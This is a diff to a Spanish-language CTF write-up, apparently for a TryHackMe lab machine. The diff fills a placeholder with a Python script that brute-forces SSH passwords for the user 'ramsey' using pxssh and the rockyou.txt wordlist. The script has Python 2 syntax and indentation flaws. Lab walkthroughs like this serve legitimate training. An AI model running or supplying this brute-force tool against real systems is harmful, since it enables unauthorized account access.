@@ -180,7 +180,53 @@ done; wait
   Como vimos que en **bash_history** estaba entrado por **ssh** con el usuario **ramsey** nosotros también entraremos con ese usuario pero como no conocemos la contraseña haré un pequeño script en python para hacer fuerza bruta a el servicio **ssh**.
 
   ```python
-  [!] Pendiente
+  #!/usr/bin/python3
+
+from pexpect import pxssh
+from pwn import *
+import signal
+import sys
+
+def def_handler(sig, frame):
+    print "\n[!] Exit..."
+    sys.exit(1)
+
+#CTRL C
+signal.signal(signal.SIGINT, def_handler)
+
+
+def conectar(User,Pass):
+	try:
+	        conectar=pxssh.pxssh()
+	        conectar.login(host,User,Pass)
+	        print "User and Password Correct"
+	        print "[*]User: {}".format(User) + "[*]Password: {}".format(Pass)
+	        print "***ACCESS PERMITTED***"
+
+	        return True
+
+	except:
+	        return False
+
+
+
+if __name__ == '__main__':
+
+    host=raw_input("HOST: ")
+    User=raw_input("Ingresa el user: ")
+
+    passw=open('rockyou.txt', 'r')
+    Pass=passw.read().split("\n")
+
+    p1 = log.progress("Fuerza Bruta ssh")
+    p1.status("Iniciando Fuerza bruta...")
+    time.sleep(3)
+
+    i = 0
+    while not conectar(User,Pass[i]):
+    	p1.status("Probando password %s" % Pass[i].strip('\n'))
+        i += 1
+
   ```
   <p align="center">
   <img src="https://github.com/Wiinsad/winsad/blob/master/assets/images/machines/THM/UbaketPie/intrusion/script2.png?raw=true">
